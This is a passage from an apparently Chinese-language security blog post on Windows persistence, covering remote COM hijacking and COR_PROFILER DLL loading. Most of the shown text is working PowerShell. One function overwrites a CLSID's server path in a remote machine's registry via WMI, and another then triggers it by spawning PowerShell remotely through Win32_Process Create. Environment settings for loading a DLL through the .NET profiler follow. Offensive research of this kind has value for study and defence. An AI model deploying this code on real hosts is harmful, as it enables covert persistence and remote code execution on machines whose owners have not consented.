class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> Set-ComHiject</div><div class="line">&#123;</div><div class="line">    <span class="keyword">Param</span></div><div class="line">    (</div><div class="line">       [System.Management.Automation.PSCredential]<span class="variable">$Credential</span>,</div><div class="line">       [string]<span class="variable">$ComputerName</span>,</div><div class="line">       [ValidateSet(<span class="string">"HKCR"</span>,<span class="string">"HKLM"</span>,<span class="string">"HKCU"</span>)][String]<span class="variable">$RegHive</span>,</div><div class="line">       [string]<span class="variable">$Clsid</span>,</div><div class="line">       [string]<span class="variable">$HijectComPath</span></div><div class="line">    )</div><div class="line">    <span class="keyword">if</span> (<span class="variable">$RegHive</span> <span class="nomarkup">-eq</span> <span class="string">"HKCR"</span>) </div><div class="line">    &#123;</div><div class="line">        <span class="variable">$HK</span> = <span class="number">2147483648</span></div><div class="line">        <span class="variable">$KeyPath</span> =<span class="string">"CLSID"</span></div><div class="line">    &#125; </div><div class="line">    <span class="keyword">elseif</span> (<span class="variable">$RegHive</span> <span class="nomarkup">-eq</span> <span class="string">"HKLM"</span>) </div><div class="line">    &#123;</div><div class="line">        <span class="variable">$HK</span> = <span class="number">2147483650</span></div><div class="line">        <span class="variable">$KeyPath</span> = <span class="string">"SOFTWARE\Classes\CLSID"</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">elseif</span> (<span class="variable">$RegHive</span> <span class="nomarkup">-eq</span> <span class="string">"HKCU"</span>) </div><div class="line">    &#123;</div><div class="line">        <span class="variable">$HK</span> = <span class="number">2147483649</span></div><div class="line">        <span class="variable">$KeyPath</span> = <span class="string">"SOFTWARE\Classes\CLSID"</span></div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment"># 首先遍历是否存在ServerName32 一来可以判断是否存在CLSID 二来可以获取ServerName的类型</span></div><div class="line">    <span class="variable">$KeyPath2</span> = <span class="variable">$KeyPath</span> + <span class="string">"\"</span> + <span class="variable">$Clsid</span></div><div class="line">    <span class="variable">$Server32Names</span> = Get-Server32Name -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span> -HK <span class="variable">$HK</span>  -strKeyPath <span class="variable">$KeyPath2</span></div><div class="line">    <span class="keyword">if</span>(<span class="variable">$Server32Names</span> <span class="nomarkup">-ne</span> <span class="literal">$null</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(<span class="variable">$Server32Names</span>.count <span class="nomarkup">-eq</span> <span class="number">2</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="variable">$Server32Name</span> = <span class="string">"InProcServer32"</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>((<span class="variable">$Server32Names</span> <span class="nomarkup">-contains</span> <span class="string">"LocalServer32"</span>) <span class="nomarkup">-eq</span> <span class="literal">$True</span>) <span class="comment">#LocalServer32</span></div><div class="line">            &#123;</div><div class="line">                <span class="variable">$Server32Name</span> = <span class="string">"LocalServer32"</span></div><div class="line">            &#125;</div><div class="line">            <span class="keyword">elseif</span>((<span class="variable">$Server32Names</span> <span class="nomarkup">-contains</span> <span class="string">"InProcServer32"</span>) <span class="nomarkup">-eq</span> <span class="literal">$True</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="variable">$Server32Name</span> = <span class="string">"InProcServer32"</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="comment"># 修改注册表</span></div><div class="line">        <span class="variable">$RegKey</span> = <span class="variable">$KeyPath2</span> + <span class="string">"\"</span> + <span class="variable">$Server32Name</span></div><div class="line">        <span class="variable">$KeyValue</span>= <span class="variable">$HijectComPath</span></div><div class="line">        <span class="variable">$KeyName</span> = <span class="string">""</span></div><div class="line">        <span class="variable">$RegSetValue</span> = <span class="built_in">Invoke-WmiMethod</span>  -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span>  -Class StdRegProv -Name SetStringValue -ArgumentList <span class="variable">$HK</span>,<span class="variable">$RegKey</span>,<span class="variable">$KeyValue</span>,<span class="variable">$KeyName</span></div><div class="line">        </div><div class="line">        <span class="comment"># 检查操作结果</span></div><div class="line">        <span class="keyword">if</span>(<span class="variable">$RegSetValue</span>.ReturnValue <span class="nomarkup">-eq</span> <span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="comment"># 读取操作结果</span></div><div class="line">            <span class="variable">$RegGetValue</span> = <span class="built_in">Invoke-WmiMethod</span> -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span>  -class StdRegProv -Name GetStringValue -ArgumentList <span class="variable">$HK</span>,<span class="variable">$RegKey</span>,<span class="variable">$KeyName</span></div><div class="line">            <span class="keyword">if</span>((<span class="variable">$RegGetValue</span>.ReturnValue <span class="nomarkup">-eq</span> <span class="number">0</span>) -and (<span class="variable">$RegGetValue</span>.sValue <span class="nomarkup">-eq</span> <span class="variable">$KeyValue</span>))</div><div class="line">            &#123;</div><div class="line">                <span class="comment"># 确认是否触发</span></div><div class="line">                <span class="variable">$Flag</span> = <span class="built_in">Read-Host</span> <span class="string">"[!]whether to trigger com hijacking[Y/N]&gt;"</span></div><div class="line">                <span class="keyword">if</span>(<span class="variable">$Flag</span>.ToLower() <span class="nomarkup">-eq</span> <span class="string">"y"</span>)</div><div class="line">                &#123;</div><div class="line">                     <span class="variable">$Process</span> = RemoteCreateInstance -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span> -Clsid <span class="variable">$Clsid</span></div><div class="line">                     <span class="keyword">if</span>(<span class="variable">$Process</span> <span class="nomarkup">-ne</span> <span class="literal">$null</span>)</div><div class="line">                     &#123;</div><div class="line">                        <span class="built_in">Write-Host</span> <span class="string">"[*]maybe trigger com hijacking success"</span></div><div class="line">                     &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="variable">$Clsid</span> = <span class="variable">$KeyName</span></div><div class="line">        <span class="built_in">Write-Host</span> <span class="string">"[!]do not find $&#123;Clsid&#125;"</span></div><div class="line">    &#125;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>   <img src="http://hacky.wang/blog/20210921/6rFLehVCg4mc.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后一步，可能就是触发COM劫持，一般而言，实例化COM是加载CLSID的二进制文件的原因，所以在本地通常使用CreateInstance实例化CLSID,我以为可以使用<code>[activator]::CreateInstance([type]::GetTypeFromCLSID($Clsid,$ComputerName))</code>进行远程实例化，但是，实际上这是不可以的。因为这些CLSID并不是DCOM。而是普通COM，其并不具有远程实例化的能力。<br>   <img src="http://hacky.wang/blog/20210921/1lpY8WoHrekm.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以，我只能把其映射到远程计算机本地去处理，在WMImplant中，我曾经修改过其代码，以便其能远程执行代码。其原理是利用Win32_Process类的Create函数创建带参数的powershell进行远程执行代码。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">function RemoteCreateInstance</div><div class="line">&#123;</div><div class="line">     Param</div><div class="line">    (</div><div class="line">       [System<span class="selector-class">.Management</span><span class="selector-class">.Automation</span><span class="selector-class">.PSCredential</span>]<span class="variable">$Credential</span>,</div><div class="line">       [string]<span class="variable">$ComputerName</span>,</div><div class="line">       [string]<span class="variable">$Clsid</span></div><div class="line">    )</div><div class="line">    #<span class="variable">$Clsid</span> = <span class="string">"&#123;00020818-0000-0000-C000-000000000046&#125;"</span></div><div class="line">    <span class="variable">$command</span> = <span class="string">"[activator]::CreateInstance([type]::GetTypeFromCLSID('$Clsid'))"</span></div><div class="line">    #<span class="variable">$bytes</span> = [System<span class="selector-class">.Text</span><span class="selector-class">.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</div><div class="line">    #<span class="variable">$encodedCommand</span> = [Convert]::ToBase64String(<span class="variable">$bytes</span>)</div><div class="line">    <span class="variable">$remote_command</span> = <span class="string">"powershell.exe powershell -Command &#123;$command&#125;"</span></div><div class="line">    <span class="variable">$process</span> = Invoke-WmiMethod -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span> -Class Win32_Process -EnableAllPrivileges -Impersonation <span class="number">3</span> -Authentication Packetprivacy -Name Create -Argumentlist <span class="variable">$remote_command</span> </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="http://hacky.wang/blog/20210921/ohNMS7W9rOIv.png?imageslim" alt="mark"><br><img src="http://hacky.wang/blog/20210921/uYsAivClAq6Y.png?imageslim" alt="mark"></p>
+<h2 id="0x02-COR-PROFILE"><a href="#0x02-COR-PROFILE" class="headerlink" title="0x02 COR_PROFILE"></a>0x02 COR_PROFILE</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;COR_PROFILER是.NET Framework提供的一项监视或者调试CRL托管代码，这是一个.dll文件，并在运行的时候由CLR进行加载。具体技术细节可以参考微软的相关技术文章。<a href="https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview" target="_blank" rel="external">https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview</a></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;COR_PROFILE通常使用环境变量注册COR_PROFILE，在.NET Framework 4之前，将COR_PROFILER设置一个CLSID，当创建.NET进程后，就会读取该CLSID下设置的COM服务器，并加载对应的二进制文件，在.NET Framework 4之后，只需要设置COR_PROFILER_PATH为需要加载dll的路径，那么就会屏蔽COR_PROFILER设置的COM。<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="attr">COR_ENABLE_PROFILING</span>=<span class="number">1</span></div><div class="line"><span class="attr">COR_PROFILER</span>=CLSID</div><div class="line"><span class="attr">COR_PROFILER_PATH</span> = dll path</div></pre></td></tr></table></figure></p>
+<p>  <img src="http://hacky.wang/blog/20211005/K08WVetYhU3z.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为使用powershell设置环境变量，仅仅修改的是副本，也就是说，修改的环境变量会随着这次powershell进程的退出而消失。并且，通过powershell设置环境变量而注册的dll，必须设置上述三个变量才可以生效。<br>   <img src="http://hacky.wang/blog/20211005/fzQ5I6OHFkVG.png?imageslim" alt="mark"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/08/16/CVE-2015-2546内核提权漏洞分析/" rel="next" title="CVE-2015-2546内核提权漏洞分析">
+                <i class="fa fa-chevron-left"></i> CVE-2015-2546内核提权漏洞分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">HaCky</p>
+              <p class="site-description motion-element" itemprop="description">我是最菜的HaCky呀</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">73</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-COM劫持"><span class="nav-number">2.</span> <span class="nav-text">0x01 COM劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-1-COM模型"><span class="nav-number">2.1.</span> <span class="nav-text">0x1.1 COM模型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-2-Hunting-COM"><span class="nav-number">2.2.</span> <span class="nav-text">0x1.2 Hunting COM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-3-如何利用-COM-Hiject"><span class="nav-number">2.3.</span> <span class="nav-text">0x1.3 如何利用 COM Hiject</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-4-远程COM-Hiject"><span class="nav-number">2.4.</span> <span class="nav-text">0x1.4 远程COM Hiject</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-COR-PROFILE"><span class="nav-number">3.</span> <span class="nav-text">0x02 COR_PROFILE</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">HaCky</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
